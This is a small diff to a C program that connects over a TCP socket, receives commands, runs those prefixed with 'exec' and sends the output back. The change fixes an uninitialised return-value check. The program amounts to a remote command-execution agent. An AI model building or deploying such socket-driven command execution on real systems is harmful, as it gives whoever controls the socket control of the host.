@@ -27,7 +27,7 @@ int main(int argc,char* argv[])
     int sock_fd = socket(AF_INET,SOCK_STREAM, 0);
     struct sockaddr_in servaddr;
     char buf[BUFFER_SIZE];
-    int filesize, chunk;
+    int filesize, chunk, rv;
     FILE *fp;    
     char *cmd;
     struct timeval timeout={1800,0};
@@ -59,7 +59,7 @@ int main(int argc,char* argv[])
             if(strcmp(buf, "close") == 0){
                 break;
             } else if(strncmp(buf, "exec", 4) == 0){
-                execcmd(buf + 4);
+                rv = execcmd(buf + 4);
                 if(rv > 0){
                     sendresult(sock_fd, buf);
                 }
